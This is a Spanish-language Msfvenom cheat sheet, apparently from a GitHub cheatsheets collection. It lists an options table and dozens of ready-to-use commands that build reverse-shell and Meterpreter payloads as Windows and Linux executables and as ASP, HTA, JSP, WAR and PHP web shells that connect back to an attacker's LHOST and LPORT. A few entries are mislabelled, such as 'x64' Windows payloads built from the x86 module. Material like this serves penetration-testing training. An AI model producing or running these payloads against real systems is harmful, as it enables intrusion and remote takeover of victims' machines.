# Msfvenom Cheat Sheet

| Comando| Uso                    |
| :-------------: | :------------------------------ |
| **`-p`**      | Mostrar opciones estándar de payload       |
| **`-l`**      | Listar el tipo de módulo (payloads, encoders, nops, platforms, archs, encrypt, formats, all)       |
| **`-f`**      | Formato de salida *(asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, jsp, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-cmd, psh-net, psh-reflection, raw, vba, vba-exe, vba-psh, vbs, war)*       |
| **`-e`**      | Definir qué codificador usar       |
| **`-a`**      | Definir qupe plataforma usar       |
| **`-s`**      | Definir la capacidad máxima de payload       |
| **`-b`**      | Definir conjunto de caracteres para no usar       |
| **`-i`**      | Definir el número de veces que se usará el codificador       |
| **`-x`**      | Definir un archivo personalizado para usar como plantilla       |
| **`-o`**      | Guardar Payload       |
| **`-h`**      | Ayuda       |
| **`--platform`**      | Definir una plataforma (android, apple_ios, linux, multi, php, python, solaris, unix, windows, etc)       |
| **`--encrypt`**      | Definir un método de encriptación al payload (aes256, base64, rc4, xor)       |
| **`msfvenom -p <Payload> --list-options`**      | Información sobre el uso de un payload       |

---

## Non-Meterpreter Binaries

#### Staged Payload for Windows - x86
```
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
```

#### Staged Payload for Windows - x64
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

#### Stageless Paylod for Windows - x86
```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
```

#### Stageless Paylod for Windows - x64
```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

#### Staged Payload for Linux - x86
```
msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
```

#### Staged Payload for Linux - x64
```
msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

#### Stageless Paylod for Linux - x86
```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
```

#### Stageless Paylod for Linux - x64
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

## Non-Meterpreter Web Payloads

#### ASP
```
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
```

#### HTA
```
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f hta > shell.hta
```

#### JSP
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
```

#### WAR
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
```

#### PHP
```
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```
---

## Meterpreter Binaries

#### Staged Payloads for Windows - x86
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
```

#### Staged Payloads for Windows - x64
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

#### Stageless Payloads for Windows - x86
```
msfvenom -p windows/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
```

#### Stageless Payloads for Windows - x64
```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

#### Staged Payloads for Linux - x86
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
```

#### Staged Payloads for Linux - x64
```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

#### Stageless Payloads for Linux - x86
```
msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
```

#### Stageless Payloads for Linux - x64
```
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

## Meterpreter Web Payloads

#### ASP
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
```

#### JSP
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > example.jsp
```

#### WAR
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > example.war
```

#### PHP
```
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)